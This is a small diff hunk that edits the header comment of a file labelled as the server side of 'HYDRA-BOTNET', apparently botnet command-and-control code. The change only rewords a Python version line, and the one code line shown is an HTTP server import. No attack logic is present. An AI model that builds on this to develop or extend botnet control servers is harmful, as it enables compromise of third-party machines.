@@ -5,7 +5,7 @@
 #   * HYDRA-BOTNET v.1.0.5.0                          #
 #   * Server-side                                     #
 #   * Dev:Malcolm Mami                                #
-#   * Tested and working with python version 3.10.0   #
+#   * Python version: 3.10.0                          #
 #                                                     #
 #######################################################
 from http.server import BaseHTTPRequestHandler, HTTPServer
